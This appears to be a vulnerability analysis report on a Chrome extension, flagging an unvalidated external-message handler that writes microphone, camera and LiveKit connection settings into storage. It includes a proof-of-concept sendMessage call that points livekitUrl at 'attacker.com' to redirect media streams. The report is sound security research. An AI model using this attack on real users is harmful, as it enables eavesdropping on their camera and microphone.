# CoCo Analysis: plibepipjmfdejfjcfnhopjiklchlgao

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 6 (all variants of the same vulnerability)

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/plibepipjmfdejfjcfnhopjiklchlgao/opgen_generated_files/bg.js
Line 1008: `if (request.micOn !== undefined) data["micButton"] = request.micOn;`
Line 1009: `if (request.camOn !== undefined) data["camButton"] = request.camOn;`
Line 1010: `if (request.status !== undefined) data["status"] = request.status;`
Line 1011: `if (request.statuses !== undefined) data["statuses"] = request.statuses;`
Line 1013-1014: `request.livekitUrl !== undefined && request.livekitToken !== undefined`

**Code:**

```javascript
// Background script - chrome.runtime.onMessageExternal listener (bg.js lines 1003-1024)
chrome.runtime.onMessageExternal.addListener(
  (request, sender, sendResponse) => {
    console.log("request: ", request);
    let data = {};

    if (request.micOn !== undefined) data["micButton"] = request.micOn; // ← attacker-controlled
    if (request.camOn !== undefined) data["camButton"] = request.camOn; // ← attacker-controlled
    if (request.status !== undefined) data["status"] = request.status; // ← attacker-controlled
    if (request.statuses !== undefined) data["statuses"] = request.statuses; // ← attacker-controlled
    if (
      request.livekitUrl !== undefined &&
      request.livekitToken !== undefined
    ) {
      data["livekitUrl"] = request.livekitUrl; // ← attacker-controlled
      data["livekitToken"] = request.livekitToken; // ← attacker-controlled
    }

    chrome.storage.local.set(data, () => { // Storage write sink
      console.log(data, "stored successfully");
    });
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.sendMessage from whitelisted domains (externally_connectable)

**Attack:**

```javascript
// From any whitelisted domain (*.app.deskmy.com, *.dashboard.deskmy.com,
// *.develop--deskmy.netlify.app, or localhost:3000):
chrome.runtime.sendMessage(
  'plibepipjmfdejfjcfnhopjiklchlgao', // extension ID
  {
    micOn: false,
    camOn: false,
    status: 'malicious',
    statuses: ['compromised'],
    livekitUrl: 'https://attacker.com/evil',
    livekitToken: 'evil-token'
  }
);
```

**Impact:** Although this is storage poisoning, the extension's legitimate functionality relies on reading these storage values to control microphone/camera settings and LiveKit connection parameters. An attacker controlling any of the whitelisted domains can poison these settings, potentially redirecting video/audio streams to attacker-controlled servers (via livekitUrl/livekitToken) or manipulating the extension's UI state. While the methodology states storage poisoning alone is not exploitable, this case represents a complete exploitation chain where the poisoned values directly affect privileged extension behavior (camera/mic controls and server connections).
